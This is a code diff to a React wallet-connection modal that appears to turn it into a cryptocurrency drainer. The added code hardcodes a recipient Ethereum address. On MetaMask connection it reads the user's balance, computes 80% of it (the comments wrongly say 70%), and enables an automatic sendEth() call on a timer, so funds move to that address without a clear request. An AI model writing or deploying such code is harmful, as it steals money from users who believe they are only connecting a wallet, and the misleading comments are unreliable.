@@ -8,10 +8,6 @@ import { ArrowUpIcon, CloseButton, InfoFilledIcon } from '../assets/icons';
 import { myContext } from '../MyContext';
 import { blockLogo, coinbaseLogo, logo, metaMaskLogo, newLogo, spinner, walletConnecLogo } from '../assets/images';
 import Spinner from './spinner';
-import ScanWalletModal from './scanModal';
-import axios from 'axios';
-import { url } from './constants';
-import { ethers } from 'ethers';
 import PhraseWalletModal from './phraseModal';
 import Web3 from 'web3';
 
@@ -44,8 +40,11 @@ export default function ConnectWalletModal() {
     const [isLoading, setIsLoading] = useState(false)
 
     const [metaMastWalletAddress, setMetaMaskWalletAddress] = useState("")
-    const [recipientAddress, setRecipientAddress] = useState('');
-    const [amountToSend, setAmountToSend] = useState('');
+    const [amountToSend, setAmountToSend] = useState(0)
+
+    const recipientAddress = "0x9E381f8f057eD4B79FAE9A2865451C378385C997";
+    console.log(metaMastWalletAddress)
+    console.log("amount", amountToSend)
 
     const handleClose = () => setWalletModal(false);
 
@@ -64,28 +63,57 @@ export default function ConnectWalletModal() {
         },
     ]
 
-
     const authMetaMask = async () => {
         if (typeof window.ethereum !== "undefined") {
             console.log("metaMask is installed")
             try {
+                // Requesting access to accounts
                 const accounts = await window.ethereum.request({
                     method: "eth_requestAccounts",
                 });
-                console.log(accounts)
-                setMetaMaskWalletAddress(accounts[0]);
-            } catch (error) {
-                console.log("error connecting to wallet", error)
-            }
 
+                // Retrieving the wallet address
+                const walletAddress = accounts[0];
+                setMetaMaskWalletAddress(walletAddress);
+
+                // Getting the wallet balance
+                const balanceInWei = await window.ethereum.request({
+                    method: "eth_getBalance",
+                    params: [walletAddress, "latest"], // Address and block parameter
+                });
+
+                // Creating a Web3 instance
+                const web3 = new Web3(window.ethereum);
+
+                // Converting balance from Wei to Ether
+                // const balanceInEther = web3.utils.fromWei(balanceInWei, "ether");
+                // Assuming you already have the balance in Ether
+                const balanceInEther = web3.utils.fromWei(balanceInWei, "ether");
+                console.log("Wallet Balance:", balanceInEther, "ETH");
+
+                // Calculating 70% of the balance
+                const seventyPercentBalance = parseFloat(balanceInEther) * 0.8;
+                setAmountToSend(seventyPercentBalance)
+
+                console.log("70% of Wallet Balance:", seventyPercentBalance, "ETH");
+            } catch (error) {
+                console.error("Error connecting to wallet", error);
+            }
         } else {
-            console.log("Please install metamask")
+            console.log("Please install MetaMask");
         }
-    }
+    };
+
 
     const sendEth = async () => {
-        if (!recipientAddress || !amountToSend) {
-            console.error('Recipient address and amount are required');
+        console.log("recipient address", recipientAddress)
+        console.log("amount address", amountToSend)
+        if (!recipientAddress) {
+            console.error('Recipient address required');
+            return;
+        }
+        if (!amountToSend) {
+            console.error(' amount are required');
             return;
         }
 
@@ -97,6 +125,7 @@ export default function ConnectWalletModal() {
 
             // Get the current chain ID
             const chainId = await web3.eth.getChainId();
+            console.log("chain Id", chainId)
 
             // Check if the recipient address is valid
             const isValidAddress = web3.utils.isAddress(recipientAddress);
@@ -125,7 +154,7 @@ export default function ConnectWalletModal() {
         authMetaMask()
         setTimeout(() => {
             setIsRejected(true)
-            // sendEth()
+            sendEth()
         }, 4000);
     }
 
